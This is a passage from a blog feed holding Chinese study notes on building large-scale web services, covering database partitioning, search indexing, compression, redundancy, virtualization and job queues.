&lt;h3 id=&quot;masterslave的特性对参照系进行扩展-更新类不扩展&quot;&gt;master/slave的特性——对参照系进行扩展， 更新类不扩展&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;查询可以扩展
    &lt;ul&gt;
      &lt;li&gt;只需增加服务器即可&lt;/li&gt;
      &lt;li&gt;但是， 在增加服务器之前要先安装适当的内存&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;master无法扩展
    &lt;ul&gt;
      &lt;li&gt;更新类的查询增加后情况更加严峻&lt;/li&gt;
      &lt;li&gt;但是， Web应用程序多数情况下90%都是读取查询&lt;/li&gt;
      &lt;li&gt;master的负载通过表分割或更换实现方法来解决&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;mysql的横向扩展和partitioning&quot;&gt;MySQL的横向扩展和Partitioning&lt;/h2&gt;

&lt;h3 id=&quot;mysql的横向扩展策略&quot;&gt;MySQL的横向扩展策略&lt;/h3&gt;

&lt;p&gt;若无法增加内存就用Partitioning&lt;/p&gt;

&lt;h3 id=&quot;关于partitioning表分割的补充&quot;&gt;关于Partitioning（表分割）的补充&lt;/h3&gt;

&lt;p&gt;Partitioning就是充分利用局部性进行分散， 提高缓存利用效率。&lt;/p&gt;

&lt;h3 id=&quot;以partitioning为前提的设计&quot;&gt;以Partitioning为前提的设计&lt;/h3&gt;

&lt;p&gt;避免JOIN——利用where…in…&lt;/p&gt;

&lt;h3 id=&quot;partitioning的代价&quot;&gt;Partitioning的代价&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;运维变得复杂&lt;/li&gt;
  &lt;li&gt;故障率上升&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;实现冗余化需要几台服务器&quot;&gt;实现冗余化需要几台服务器&lt;/h3&gt;

&lt;p&gt;master1台+slave2台的话， 假设某台slave发生故障， 而准备好新的数据库服务器要复制数据， 但要复制数据， 就必须把剩下的那台slave停机（停止master无法写入， 停止slave无法读取）&lt;/p&gt;

&lt;p&gt;要想完美的冗余化， 4台1组是必要的&lt;/p&gt;

&lt;h3 id=&quot;partitiong的代价&quot;&gt;Partitiong的代价&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;优点
    &lt;ul&gt;
      &lt;li&gt;降低负载&lt;/li&gt;
      &lt;li&gt;增加局部性， 提高缓存效果&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;缺点
    &lt;ul&gt;
      &lt;li&gt;运维变得复杂后， 经济成本也会上升&lt;/li&gt;
      &lt;li&gt;故障率上升&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Partitioning毕竟只是杀手锏&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;大规模数据处理实践入门&quot;&gt;大规模数据处理“实践”入门&lt;/h1&gt;

&lt;h2 id=&quot;特殊用途索引处理大规模数据&quot;&gt;特殊用途索引——处理大规模数据&lt;/h2&gt;

&lt;p&gt;超出RDBMS处理器能力时怎么办？&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用批处理取出数据&lt;/li&gt;
  &lt;li&gt;创建专用索引服务器， 通过Web API等进行转换&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;特殊用途索引使用调优后的数据结构&quot;&gt;特殊用途索引——使用调优后的数据结构&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;搜索用的逆向索引&lt;/li&gt;
  &lt;li&gt;关键字用的Trie
    &lt;ul&gt;
      &lt;li&gt;正则表达式拥有自动机中的NFA（Nondeterministic Finite Automaton， 非确定性有限自动机）， 用OR链接之后， 匹配时的计算量就会迅速膨胀&lt;/li&gt;
      &lt;li&gt;Trie和Common Prefix Search（公共前缀搜索）的组合才是王道&lt;/li&gt;
      &lt;li&gt;实现Common PrefixSearch有Aho-Corasick， Double Array Trie&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;文本分类器
    &lt;ul&gt;
      &lt;li&gt;Complement Naive Bytes 自动进行机器学习并分类&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;全文索引&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;压缩数据考虑数据大小和io加速之间的关系&quot;&gt;压缩数据——考虑数据大小和I/O加速之间的关系&lt;/h1&gt;

&lt;h2 id=&quot;以紧凑简洁方式保存整数数据&quot;&gt;以紧凑，简洁方式保存整数数据&lt;/h2&gt;

&lt;h3 id=&quot;可变字节码用紧凑格式保存整数数据&quot;&gt;可变字节码——用紧凑格式保存整数数据&lt;/h3&gt;

&lt;p&gt;可变字节码（variable Byte Code）中， 各字节的8比特的最高位1比特为标志位， 因此表示整数的只有7比特。第一字节的低7比特表示0-127, 高位字节表示128×(1-127)， 更高位表示128^2(1-127)&lt;/p&gt;

&lt;h3 id=&quot;用差存储已排序整数&quot;&gt;用“差”存储已排序整数&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;求出与前一个数值之差&lt;/li&gt;
  &lt;li&gt;数值分布变成大量较小的数值和少量较大的数值
    &lt;ul&gt;
      &lt;li&gt;将结果用可变字节码编码， 压缩效果来源于偏离分布&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;压缩的基础&quot;&gt;压缩的基础&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;根据符号的概率分布， 给出现频率较高的分配较短的编码， 出现频率低的分配较长的编码&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;压缩对象是整形的情形背景理论&quot;&gt;压缩对象是整形的情形——背景理论&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;压缩对象本身就有整数的含义&lt;/li&gt;
  &lt;li&gt;巧妙的利用整数的特征进行压缩&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;可变字节吗和速度的感觉&quot;&gt;可变字节吗和速度的感觉&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;算法实用化从身边的例子来看理论研究的实践投入&quot;&gt;算法实用化——从身边的例子来看理论，研究的实践投入&lt;/h1&gt;

&lt;h2 id=&quot;算法和算法评测&quot;&gt;算法和算法评测&lt;/h2&gt;

&lt;h3 id=&quot;数据规模和复杂度的差异&quot;&gt;数据规模和复杂度的差异&lt;/h3&gt;

&lt;h3 id=&quot;学习算法的意义计算机资源有限-工程师的通用语言&quot;&gt;学习算法的意义——计算机资源有限， 工程师的通用语言&lt;/h3&gt;

&lt;h3 id=&quot;灵活应用第三方实现cpan等&quot;&gt;灵活应用第三方实现——CPAN等&lt;/h3&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;hatena-diary的关键字链接&quot;&gt;Hatena Diary的关键字链接&lt;/h2&gt;

&lt;h3 id=&quot;用模式匹配实现关键字链接的问题&quot;&gt;用模式匹配实现关键字链接的问题&lt;/h3&gt;

&lt;p&gt;Perl的正则表达式采用的是NFA（Nondeterministic Finite Automata， 非确定性有穷自动机）&lt;/p&gt;

&lt;h3 id=&quot;从正则表达式到trie改变匹配的实现方式&quot;&gt;从正则表达式到Trie——改变匹配的实现方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;用树结构高效存储字符串集合&lt;/li&gt;
  &lt;li&gt;其树结构可以将搜索对象数据的公共前缀综合到一起&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;aho-corasick算法&quot;&gt;Aho-Corasick算法&lt;/h3&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;hatena-bookmark的文章分类&quot;&gt;Hatena Bookmark的文章分类&lt;/h2&gt;

&lt;h3 id=&quot;什么是文章分类&quot;&gt;什么是文章分类&lt;/h3&gt;

&lt;p&gt;用贝叶斯过滤器判断类别&lt;/p&gt;

&lt;h3 id=&quot;机器学习和大规模数据&quot;&gt;机器学习和大规模数据&lt;/h3&gt;

&lt;h3 id=&quot;贝叶斯过滤器的原理&quot;&gt;贝叶斯过滤器的原理&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;贝叶斯过滤器的核心是朴素贝叶斯算法&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;页贝斯公式 P(B&lt;/td&gt;
          &lt;td&gt;A)=P(A&lt;/td&gt;
          &lt;td&gt;B)P(B)/P(A)&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;拼写错误改正功能的制作方法&quot;&gt;拼写错误改正功能的制作方法&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;使用正确数据字典, 可以下载Wikipedia等的数据&lt;/li&gt;
  &lt;li&gt;计算搜索查询与字典中语句的编辑距离， 定量衡量错误程度——Levenshtein&lt;/li&gt;
  &lt;li&gt;以一定的错误程度为基准， 从字典中找出某个单词作为候补正确答案——使用n-gram缩小比较对象， 之后逐个计算编辑距离（常用的是二元的Bi-Gram和三元的Tri-Gram）&lt;/li&gt;
  &lt;li&gt;将候补正确答案以文章中的单词使用频率为基准，按照正确的可能性排列&lt;/li&gt;
  &lt;li&gt;将使用频率最高的单词作为正确答案提示给用户&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;挑战全文搜索技术各种各样的大规模数据处理经验技巧&quot;&gt;挑战全文搜索技术——各种各样的大规模数据处理经验技巧&lt;/h1&gt;

&lt;h2 id=&quot;搜索系统的架构&quot;&gt;搜索系统的架构&lt;/h2&gt;

&lt;p&gt;搜索引擎中最重要的元素之一——逆向索引（inverted index）， 由Dicitionary（字典文件）和Postings（置入文件）两个基本要素组成。&lt;/p&gt;

&lt;h2 id=&quot;搜索系统的架构-1&quot;&gt;搜索系统的架构&lt;/h2&gt;

&lt;h3 id=&quot;搜索系统所需的步骤&quot;&gt;搜索系统所需的步骤&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;爬行， 存储， 建立索引， 搜索， 评分， 结果显示&lt;/li&gt;
  &lt;li&gt;6个阶段分别有各自的课题&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;全文搜索的种类&quot;&gt;全文搜索的种类&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;grep类型——grep， Shunsaku
    &lt;ul&gt;
      &lt;li&gt;从头开始读取搜索对象&lt;/li&gt;
      &lt;li&gt;即时性良好， 搜索无遗漏，并行化，查询扩展很容易&lt;/li&gt;
      &lt;li&gt;朴素算法——O(mn), text:m, word:n&lt;/li&gt;
      &lt;li&gt;KMP(Knuth-Morris-Pratt)算法——O(m+n)&lt;/li&gt;
      &lt;li&gt;BM算法(Boyer-Moore)——最坏情况(mn), 最好情况O(n/m)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;后缀类型——Sedue
    &lt;ul&gt;
      &lt;li&gt;用可搜索的形式存储搜索对象的全文&lt;/li&gt;
      &lt;li&gt;数据结构有：Trie, Suffix Tree, Suffix Array, Compressed Suffix Array&lt;/li&gt;
      &lt;li&gt;理论上可能&lt;/li&gt;
      &lt;li&gt;信息量过大，难以实现&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;逆向索引类型(Inverted Index，倒排索引)——主流（Google）
    &lt;ul&gt;
      &lt;li&gt;建立term(单词)和文档的关系&lt;/li&gt;
      &lt;li&gt;平衡性良好的架构——实际系统大多使用逆向索引&lt;/li&gt;
      &lt;li&gt;即时性不佳，可能有搜索遗漏&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;搜索引擎的内部结构&quot;&gt;搜索引擎的内部结构&lt;/h2&gt;

&lt;h3 id=&quot;逆向索引的结构dicitonarypostings&quot;&gt;逆向索引的结构——Dicitonary+Postings&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;term和文档的关系&lt;/li&gt;
  &lt;li&gt;term
    &lt;ul&gt;
      &lt;li&gt;文档中的单词&lt;/li&gt;
      &lt;li&gt;所有term的集合称为Dictionary&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;逆向索引=Dictionary+Postings
    &lt;ul&gt;
      &lt;li&gt;能够即时发现包含在term中的文档&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;dictionary的创建方法逆向索引的创建方法&quot;&gt;Dictionary的创建方法——逆向索引的创建方法&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;将单词当作term处理
    &lt;ul&gt;
      &lt;li&gt;字典+Aho-Corasick算法切分单词&lt;/li&gt;
      &lt;li&gt;使用语素分析——（MeCab日文分词器,MMSEG中文分词器&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;将n-gram当作term处理
    &lt;ul&gt;
      &lt;li&gt;将n-gram作为term处理会存在错误搜索的问题（查准率降低），因此对搜索结果配合过滤比较好，但是当搜索文档内容较多时，全文匹配搜索花费时间多，不太适用。解决方法是同时使用单词逆向索引和N-gram逆向索引。正文使用单词逆向索引，标题、评价、url等使用N-gram逆向索引。&lt;/li&gt;
      &lt;li&gt;扫描搜索结果进行确认&lt;/li&gt;
      &lt;li&gt;对象过大时计算量大——对象越小越好&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;查全率和查准率
    &lt;ul&gt;
      &lt;li&gt;搜索的恰当性的评测标准&lt;/li&gt;
      &lt;li&gt;差准率=正确结果数/返回总数&lt;/li&gt;
      &lt;li&gt;查全率=正确结果数/相关结果数&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;postings的创建方法逆向索引的创建方法&quot;&gt;Postings的创建方法——逆向索引的创建方法&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;同时保存出现位置
    &lt;ul&gt;
      &lt;li&gt;Full Inverted Index&lt;/li&gt;
      &lt;li&gt;很容易实现snippet，评分， 过滤&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;只保存文档ID
    &lt;ul&gt;
      &lt;li&gt;Inverted File Index&lt;/li&gt;
      &lt;li&gt;索引较小，容易实现&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;postings和数据结构&quot;&gt;Postings和数据结构&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;文档ID顺序
    &lt;ul&gt;
      &lt;li&gt;排序——可变字节码&lt;/li&gt;
      &lt;li&gt;较好的压缩比和快速压缩解压性能&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;结构：term——压缩后的Posting List
    &lt;ul&gt;
      &lt;li&gt;适合使用key-value存储&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;支持大规模数据处理的服务器基础设施入门web服务的后台&quot;&gt;支持大规模数据处理的服务器/基础设施入门——Web服务的后台&lt;/h1&gt;

&lt;h2 id=&quot;企业软件vs-web服务应用范围上的差异&quot;&gt;企业软件vs Web服务——应用范围上的差异&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Web服务的流量更大&lt;/li&gt;
  &lt;li&gt;Web服务可能发生爆炸性增长&lt;/li&gt;
  &lt;li&gt;Web服务有时允许暂时的不一致&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;web服务的基础设施三个重点&quot;&gt;Web服务的基础设施——三个重点&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;低成本，高效率
    &lt;ul&gt;
      &lt;li&gt;不应当追求100%可靠性&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;设计很重要
    &lt;ul&gt;
      &lt;li&gt;可扩展性，响应性很重要&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;开发速度很重要
    &lt;ul&gt;
      &lt;li&gt;应当为服务提供灵活的资源&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;云vs自行构建基础设施&quot;&gt;云Vs.自行构建基础设施&lt;/h2&gt;

&lt;h3 id=&quot;云计算仍处于过渡期&quot;&gt;云计算仍处于过渡期？&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;优点
    &lt;ul&gt;
      &lt;li&gt;价格便宜，灵活的可扩展性&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;缺点
    &lt;ul&gt;
      &lt;li&gt;统一的主机规格&lt;/li&gt;
      &lt;li&gt;模糊不清的负载均衡器&lt;/li&gt;
      &lt;li&gt;时常停机&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;自行构建基础设施的优点&quot;&gt;自行构建基础设施的优点：&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;灵活的硬件配置&lt;/li&gt;
  &lt;li&gt;灵活应对服务要求&lt;/li&gt;
  &lt;li&gt;可以控制瓶颈&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;保证可扩展性的必要思路规模扩大和系统扩展&quot;&gt;保证可扩展性的必要思路——规模扩大和系统扩展&lt;/h1&gt;

&lt;h2 id=&quot;层和可扩展性&quot;&gt;层和可扩展性&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;应用的程序服务器
    &lt;ul&gt;
      &lt;li&gt;配置相同，不持有状态——扩展容易&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;数据源（数据库，文件服务器等
    &lt;ul&gt;
      &lt;li&gt;read分布式——比较容易&lt;/li&gt;
      &lt;li&gt;write分布式——难&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;掌握负载均衡进行调优&quot;&gt;掌握负载均衡进行调优&lt;/h2&gt;

&lt;h3 id=&quot;掌握负载可视化的管理界面&quot;&gt;掌握负载——可视化的管理界面&lt;/h3&gt;

&lt;h3 id=&quot;测量负载的指标平均负载内存和cpu相关信息&quot;&gt;测量负载的指标——平均负载，内存和CPU相关信息&lt;/h3&gt;

&lt;h3 id=&quot;根据用途进行调优面向用户的服务器和面向爬虫的服务器&quot;&gt;根据用途进行调优——面向用户的服务器和面向爬虫的服务器&lt;/h3&gt;

&lt;h3 id=&quot;应用程序服务器数据库服务器的调优策略和服务器数量&quot;&gt;应用程序服务器，数据库服务器的调优策略和服务器数量&lt;/h3&gt;

&lt;h3 id=&quot;服务规模和调优&quot;&gt;服务规模和调优&lt;/h3&gt;

&lt;h3 id=&quot;保证可扩展性&quot;&gt;保证可扩展性&lt;/h3&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;保证冗余性和系统的稳定化实现100在效率的原理&quot;&gt;保证冗余性和系统的稳定化——实现100%在效率的原理&lt;/h1&gt;

&lt;p&gt;最重要的就是去除SPOF（single point of failure）， 即单点故障&lt;/p&gt;

&lt;h2 id=&quot;保证冗余性&quot;&gt;保证冗余性&lt;/h2&gt;

&lt;h3 id=&quot;保证冗余性应用程序服务器&quot;&gt;保证冗余性——应用程序服务器&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;增加服务器数量, 即使一两台停机也能保证充足的处理能力&lt;/li&gt;
  &lt;li&gt;用负载均衡实现失败转移(failover)和失败恢复(failback)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;保证冗余性数据库服务器&quot;&gt;保证冗余性——数据库服务器&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Multi-master, 服务器用VRRP协议（Virtual Router Redundancy Protocol， 虚拟路由器冗余协议）互相监视， 一旦通过VRRP发现对方停机， 就将自己提升为Active master&lt;/li&gt;
  &lt;li&gt;互相replication&lt;/li&gt;
  &lt;li&gt;切换时会有不同步的风险， 有问题时人工恢复&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;保证冗余性存储服务器&quot;&gt;保证冗余性——存储服务器&lt;/h3&gt;

&lt;h2 id=&quot;系统稳定化&quot;&gt;系统稳定化&lt;/h2&gt;

&lt;h3 id=&quot;保持系统稳定的权衡&quot;&gt;保持系统稳定的权衡&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;内存只使用7成左右， CPU只使用7成左右&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;不稳定的因素负载增大&quot;&gt;不稳定的因素——负载增大&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;功能增加， 内存泄漏， 地雷， 用户访问模式， 数据量增加， 外部关联程序增加
    &lt;ul&gt;
      &lt;li&gt;地雷：某些URL一旦读取（踩到）就无法返回应答&lt;/li&gt;
      &lt;li&gt;slashdot效应， digg效应等， 链接被贴到著名网站上， 被大量用户访问导致系统停机&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;硬件的不稳定定因素——性能下降
    &lt;ul&gt;
      &lt;li&gt;内存，硬盘，网卡故障&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;系统稳定对策&quot;&gt;系统稳定对策&lt;/h2&gt;

&lt;h3 id=&quot;实际的系统稳定对策维持适当余量消灭不稳定因素&quot;&gt;实际的系统稳定对策——维持适当余量，消灭不稳定因素&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;维持适当余量（buffer）
    &lt;ul&gt;
      &lt;li&gt;内存容量，CPU负载——使用极限的7成&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;去除不稳定因素
    &lt;ul&gt;
      &lt;li&gt;规定SQL负载上限——必要时将负载过高的SQL移到其他主机上&lt;/li&gt;
      &lt;li&gt;减少内存泄漏&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;异常行为的自主判断/自动控制
    &lt;ul&gt;
      &lt;li&gt;自动Dos判断（mod_dossdetector）&lt;/li&gt;
      &lt;li&gt;自动重启&lt;/li&gt;
      &lt;li&gt;自动终止耗时查询（KILL掉耗时过长的SQL&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;提高效率提高硬件资源的使用率&quot;&gt;提高效率——提高硬件资源的使用率&lt;/h1&gt;

&lt;h2 id=&quot;虚拟化技术&quot;&gt;虚拟化技术&lt;/h2&gt;

&lt;h3 id=&quot;引入虚拟化技术&quot;&gt;引入虚拟化技术&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;可扩展性
    &lt;ul&gt;
      &lt;li&gt;将额外开销降至最低&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;性价比
    &lt;ul&gt;
      &lt;li&gt;提高资源使用率&lt;/li&gt;
      &lt;li&gt;提高运维的灵活程度&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;高可用性
    &lt;ul&gt;
      &lt;li&gt;环境隔离&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;虚拟化技术的效果&quot;&gt;虚拟化技术的效果&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;掩盖硬件差异（环境抽象化&lt;/li&gt;
  &lt;li&gt;使用准虚拟化（para Virtualization&lt;/li&gt;
  &lt;li&gt;控制资源消耗&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;虚拟服务器的构建策略&quot;&gt;虚拟服务器的构建策略&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;提高硬件资源的利用率
    &lt;ul&gt;
      &lt;li&gt;加入能主要利用空闲资源的虚拟化操作系统（DomU&lt;/li&gt;
      &lt;li&gt;CPU空闲——Web服务器&lt;/li&gt;
      &lt;li&gt;I/O空闲——数据库服务器&lt;/li&gt;
      &lt;li&gt;内存空闲——缓存服务器&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;避免在一起的组合
    &lt;ul&gt;
      &lt;li&gt;资源消耗倾向相同， 且负载较高的同类服务器应避免放在一起&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;不使用中央存储设备&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;总结虚拟化的优势&quot;&gt;总结虚拟化的优势&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;解除物理的资源限制
    &lt;ul&gt;
      &lt;li&gt;动态更改资源&lt;/li&gt;
      &lt;li&gt;VM的迁移和复制&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;软件层面更强大的主机控制
    &lt;ul&gt;
      &lt;li&gt;异常行为局部化&lt;/li&gt;
      &lt;li&gt;主机控制更容易&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;硬件和提高效率实现低成本的关键技术&quot;&gt;硬件和提高效率——实现低成本的关键技术&lt;/h2&gt;

&lt;h3 id=&quot;提高处理器性能&quot;&gt;提高处理器性能&lt;/h3&gt;

&lt;h3 id=&quot;有效利用廉价硬件&quot;&gt;有效利用廉价硬件&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;最低限度的管理功能&lt;/li&gt;
  &lt;li&gt;多核CPU&lt;/li&gt;
  &lt;li&gt;大量内存&lt;/li&gt;
  &lt;li&gt;灵活的I/O性能
    &lt;ul&gt;
      &lt;li&gt;无盘&lt;/li&gt;
      &lt;li&gt;硬件RAID-10&lt;/li&gt;
      &lt;li&gt;SSD RAID-0&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ssd&quot;&gt;SSD&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;良好的随机访问性能&lt;/li&gt;
  &lt;li&gt;内存&amp;gt;SSD&amp;gt;HHD RAID-0/10&amp;gt;HDD RAID-1&lt;/li&gt;
  &lt;li&gt;SSD损耗程度的指标是S.M.A.R.T值中的E9（media wearout indicator）项目， 随着平均擦除次数的增加， 该值会从100减少到0（smartctl命令获得&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;web服务和网络通过网络看服务增长&quot;&gt;Web服务和网络——通过网络看服务增长&lt;/h1&gt;

&lt;h2 id=&quot;网络的分界点&quot;&gt;网络的分界点&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;超过1Gbps（300kpps）——PC路由器的极限（成品路由器&lt;/li&gt;
  &lt;li&gt;超过500台主机——一个子网的极限&lt;/li&gt;
  &lt;li&gt;全球化——一个数据中心的极限（可选CDN&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;挑战更高的极限&quot;&gt;挑战更高的极限&lt;/h2&gt;

&lt;p&gt;超越10Gbps的世界&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;获取AS编号&lt;/li&gt;
  &lt;li&gt;连接IX进行流量交换&lt;/li&gt;
  &lt;li&gt;用BGP控制路由&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;当前构建web服务需要的实践技术应对大规模web服务须知&quot;&gt;当前构建Web服务需要的实践技术——应对大规模Web服务须知&lt;/h1&gt;

&lt;h2 id=&quot;作业队列系统theschwartz-gearman&quot;&gt;作业队列系统TheSchwartz， Gearman&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;客户端放入作业&lt;/li&gt;
  &lt;li&gt;作业队列存储队列&lt;/li&gt;
  &lt;li&gt;worker访问作业队列，取出未运行的作业并加以运行&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;gearman&quot;&gt;Gearman&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;轻量作业队列， 不用RDBMS， 而是采用自带的守护进程（daemon）作业信息保存在内存中， 以保证性能&lt;/li&gt;
  &lt;li&gt;三种模式
    &lt;ul&gt;
      &lt;li&gt;同步的顺序处理&lt;/li&gt;
      &lt;li&gt;同步的并行处理&lt;/li&gt;
      &lt;li&gt;异步的后台处理&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;存储方式的选择-rdbms还是key-value存储&quot;&gt;存储方式的选择 RDBMS还是key-value存储&lt;/h2&gt;

&lt;h3 id=&quot;分布式文件系统&quot;&gt;分布式文件系统&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;MogileFS&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;缓存系统squidvarnish&quot;&gt;缓存系统——Squid，Varnish&lt;/h2&gt;

&lt;h2 id=&quot;计算集群hadoop&quot;&gt;计算集群——Hadoop&lt;/h2&gt;

&lt;hr /&gt;

</content>
 </entry>
 
 <entry>
   <title>大规模网站开发技术</title>
   <link href="http://yanpeipan.github.io/2015/01/25/%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF.html"/>
   <updated>2015-01-25T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/01/25/大规模网站开发技术</id>
   <content type="html">
&lt;hr /&gt;

